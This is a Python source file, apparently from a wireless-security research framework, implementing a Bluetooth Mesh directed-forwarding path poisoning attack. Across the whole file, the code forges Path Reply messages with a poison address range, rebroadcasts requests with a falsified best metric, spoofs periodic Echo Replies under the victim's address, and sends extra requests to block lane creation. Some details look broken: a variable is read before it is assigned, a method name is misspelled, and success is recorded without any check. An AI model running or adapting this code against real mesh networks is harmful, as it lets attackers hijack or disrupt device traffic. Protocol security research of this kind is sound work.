"""
Attacker object for the Bluetooth Mesh path poisoning via path creation hijacking (A2)
"""

import logging

from dataclasses import dataclass, field
from whad.btmesh.attacker import Attacker
from whad.scapy.layers.btmesh import (
    BTMesh_Upper_Transport_Control_Path_Request,
    UnicastAddr,
    BTMesh_Upper_Transport_Control_Path_Reply,
    BTMesh_Upper_Transport_Control_Path_Echo_Reply,
    BTMesh_Upper_Transport_Control_Path_Echo_Request,
)
from whad.btmesh.stack.utils import MeshMessageContext
from whad.btmesh.stack.constants import (
    DIRECTED_FORWARDING_CREDS,
    MANAGED_FLOODING_CREDS,
)

from time import sleep
from random import uniform
from threading import Thread, Event, Timer
from copy import copy

logger = logging.getLogger(__name__)


@dataclass
class PathPoisonHijackConfiguration:
    """Configuration for the PathPoisonHijack attack


    :param timeout: Timeout (sec) of the attack before quitting. Infinite if not specified (None).
    :param poison_adresses: The address to use as path_target in the reply. If path_target included in this range, 255 added.
    :param seqnum_start: The seqnumber to use for the first spoofed Echo Reply (gets incremented each time for each request for each poisoned path)
    :param echo_interval: The path verification interval (sec) used in the Network. If unknown, keep to 7.2 (lowest value possible). Will substract a guard of 0.2 sec. If None, no echo replies sent.
    """

    timeout: int = None
    poison_address: int = 0x0100
    seqnum_start: int = 0x000FFF
    echo_interval: float | None = 7.2


class PathPoisonHijackAttacker(Attacker):

    name = "PathPoisonHijack"
    description = "Tries to poison DF paths via hijacking of Path Reply and bypass of DF resilience features (A2)"
    need_provisioned_node = True

    def __init__(self, connector, configuration=PathPoisonHijackConfiguration()):
        """PathPoisonHijack object. Requires a provisioned node.

        For now, source address on Network layer is local's node primary address for simplicity.

        :param connector: The btmesh connector to use
        :type connector: BTMesh
        :param configuration: The configuration to use
        :type configuration: LinkCloserConfiguration
        """

        # List of poisoned paths (already formatted strings)
        self.results = []

        # Path requests already processed once/sent by us
        # Key is path_origin:FWN
        self.path_requests_processed = {}

        # used to track sequence number to be used for path echo replies. Key (path_origin:path_target) -> (seq number, creds)
        # if seq is None, use our sequence number
        self.path_echo_reply_list = {}

        super().__init__(connector, configuration)

    def _setup(self):
        """
        Setup the Upper Transport layer for the attack.
        """
        self._connector.stop()
        upper_transport = self._connector.main_stack.get_layer("upper_transport")
        upper_transport.register_custom_handler(
            BTMesh_Upper_Transport_Control_Path_Request, self.on_path_request
        )  # register our attack_callback in in upper_transport layer
        self._connector.start()
        self._is_setup = True

    def restore(self):
        """
        Restores the Upper Transport layer back to normal.
        """
        if self._is_setup:
            self._connector.stop()
            upper_transport = self._connector.main_stack.get_layer("upper_transport")
            upper_transport.unregister_custom_hanlder(
                BTMesh_Upper_Transport_Control_Path_Request
            )
            self._connector.start()
            self._is_setup = False

    def _attack_runner(self):
        self._is_attack_running = True
        self.event.clear()
        self.event.wait(self._configuration.timeout)
        self._is_attack_running = False
        return self._success

    def launch(self, asynch=True):
        """
        Launches the PathPoisonSolicitation attack. asynch is advised

        :param asynch [TODO:type]: [TODO:description]
        """
        super().launch(asynch=asynch)

    def stop(self):
        """
        Stops the attack. The event is reversed (we wait for it to be set to stop)
        """
        self.event.set()

    def on_path_request(self, message):
        """
        Handler of a BTMesh_Upper_Transport_Control_Path_Request message from our attack.
        Proceeds with the poisoning of the victim's forwarding table with a BTMesh_Upper_Transport_Control_Path_Reply hijack

        :param message [TODO:type]: [TODO:description]
        """
        if not self.is_attack_running:
            return True

        pkt, ctx = message
        key = str(pkt.path_origin_unicast_addr_range.range_start) + str(
            pkt.path_origin_forwarding_number
        )
        # If we already received that Path Request, discard
        if key in self.path_requests_processed.keys():
            return

        self.path_requests_processed[key] = message

        # Sending a Path Reply to the node that sent us the Path Request
        resp_ctx = MeshMessageContext()
        resp_ctx.creds = DIRECTED_FORWARDING_CREDS
        resp_ctx.src_addr = self._connector.profile.get_primary_element_addr()
        resp_ctx.dest_addr = ctx.src_addr
        resp_ctx.ttl = 0
        resp_ctx.is_ctl = True
        resp_ctx.net_key_id = ctx.net_key_id

        if pkt.destination in range(
            self._configuration.poison_address,
            self._configuration.poison_address + 0xFF,
        ):
            poison_address = max(0x7F00, (poison_address + 255))
        else:
            poison_address = self._configuration.poison_address

        resp_pkt = BTMesh_Upper_Transport_Control_Path_Reply(
            unicast_destination=1,
            on_behalf_of_dependent_target=1,
            confirmation_request=0,
            path_origin=pkt.path_origin_unicast_addr_range.range_start,
            path_origin_forwarding_number=pkt.path_origin_forwarding_number,
            path_target_unicast_addr_range=UnicastAddr(
                length_present=1, range_start=poison_address, range_length=0xFF
            ),
            dependent_target_unicast_addr_range=UnicastAddr(
                length_present=1,
                range_length=(0x7FFF - pkt.destination + 0xFF) & 0xFF,
                range_start=pkt.destination,
            ),
        )

        upper_transport = self._connector.main_stack.get_layer("upper_transport")
        upper_transport.send_control_message(
            (
                resp_pkt,
                resp_ctx,
            )
        )

        # start path echo reply thread
        if self._configuration.echo_interval is not None:
            key = str(resp_pkt.path_origin) + str(
                resp_pkt.path_target_unicast_addr_range.range_start
            )
            self.path_echo_reply_list[key] = (
                self._configuration.seqnum_start,
                MANAGED_FLOODING_CREDS,
            )
            echo_reply_timer = Timer(
                max(1, self._configuration.echo_interval - 1),
                self.path_echo_reply_send,
                args=[
                    resp_pkt.path_origin,
                    resp_pkt.path_target_unicast_addr_range.range_start,
                    resp_ctx.net_key_id,
                ],
            )
            echo_reply_timer.start()
        else:
            sleep(0.01)

        # Sending the forged Path Request with best metric
        resp_pkt = copy(pkt)
        resp_pkt.path_origin_path_metric = 0

        resp_ctx = copy(ctx)
        resp_ctx.creds = DIRECTED_FORWARDING_CREDS
        resp_ctx.src_addr = self._connector.profile.get_primary_element_addr()
        resp_ctx.dest_addr = 0xFFFB
        resp_ctx.ttl = 0
        resp_ctx.is_ctl = True

        upper_transport.send_control_message(
            (
                resp_pkt,
                resp_ctx,
            )
        )

        # Launch the sequence number desynch to avoid lane creation
        timer = Timer(1, self.path_request_react_send_request_lane, args=[message])
        timer.start()

        # We actually dont know if its a success, but lets pretend.
        self._success = True
        self.results.append(
            "Path poisoned, originally from %x to %x"
            % (pkt.path_origin_unicast_addr_range.range_start, pkt.destination)
        )

    def path_echo_reply_send(self, path_origin, path_target, net_key_id):
        """
        Launched in a thread to regularly send path echo reply messages for tampered paths

        :param path_origin: Primary Address of the PO
        :type path_origin: int
        :param path_target: Primary address of the PT
        :type path_target: int
        :param net_key_id: the net_key_id to use for the messages
        :type: net_key_id: int
        """
        while self.is_attack_running:
            key = str(path_origin) + str(path_target)
            seq, creds = self.path_echo_reply_list[key]
            pkt = BTMesh_Upper_Transport_Control_Path_Echo_Reply(
                destination=path_target
            )
            ctx = MeshMessageContext()
            ctx.creds = creds
            ctx.src_addr = path_target
            ctx.dest_addr = path_origin
            ctx.ttl = 0x7F
            ctx.is_ctl = True
            ctx.net_key_id = net_key_id
            ctx.seq_number = seq
            self.path_echo_reply_list[key] = (seq + 1, creds)

            upper_transport = self._connector.main_stack.get_layer("upper_transport")
            upper_transport.send_control_message(
                (
                    pkt,
                    ctx,
                )
            )
            sleep(self._configuration.echo_interval - 0.2)

    def path_request_react_send_request_lane(self, message):
        """
        For attack A2, functioned called 500ms after receiving the Path Request. Used to send a Path Request to keep nodes from creating lanes

        :param message: Original Path Request message received
        :type message: (BTMesh_Upper_Transport_Control_Path_Request, MeshMessageContext)
        """
        pkt, ctx = message

        if not self.is_attack_running:
            return

        resp_ctx = copy(ctx)
        resp_pkt = copy(pkt)
        resp_pkt.path_origin_path_metric = 0
        resp_pkt.path_origin_forwarding_number = pkt.path_origin_forwarding_number + 1

        resp_ctx.creds = DIRECTED_FORWARDING_CREDS
        resp_ctx.src_addr = self._connector.profile.get_primary_element_addr()
        resp_ctx.dest_addr = 0xFFFB
        resp_ctx.ttl = 0
        resp_ctx.is_ctl = True

        key = str(resp_pkt.path_origin_unicast_addr_range.range_start) + str(
            resp_pkt.path_origin_forwarding_number
        )
        self.path_requests_processed[key] = message

        upper_transport = self._connector.main_stack.get_layer("upper_transport")
        upper_transport.send_control_message(
            (
                resp_pkt,
                resp_ctx,
            )
        )

    def show_result(self):
        """Function implemented in each Attacker to display the result of the attack"""
        if self._is_attack_running:
            print("The PathPoisonHijack attack is still runnning asynchnously.")
            if self._success:
                self._show_list_result()
            else:
                print("No path have been poisoned so far.")
        elif self._success:
            print(
                "The PathPoisonHijack attack was a success, need to check the poisoning by checking forwarding table or sending messages from the victim."
            )
            self._show_list_result()
        else:
            print("PathPoisonHijack attack did not run once or failed.")

    def _show_list_result(self):
        for poison in self.results:
            print(poison)
